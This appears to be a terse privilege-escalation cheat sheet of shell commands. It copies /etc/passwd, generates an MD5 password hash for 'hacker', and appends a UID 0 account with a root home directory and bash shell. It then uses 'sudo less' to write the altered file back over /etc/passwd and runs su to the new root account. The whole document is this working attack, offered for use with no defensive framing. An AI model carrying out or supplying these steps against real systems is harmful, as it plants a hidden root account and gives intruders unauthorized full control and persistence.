## Add new User = hacker Password = hacker AS ROOT
cp /etc/passwd passwd

## passwod generation (opt)
openssl passwd -1 -salt hacker hacker

## with pass from line abov
echo 'hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash' >> passwd

## with pass = hacker
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> passwd

cat /tmp/szalek/passwd | sudo less
-> s -> /etc/passwd
-> q

cat /etc/passwd

su hacker
-> hacker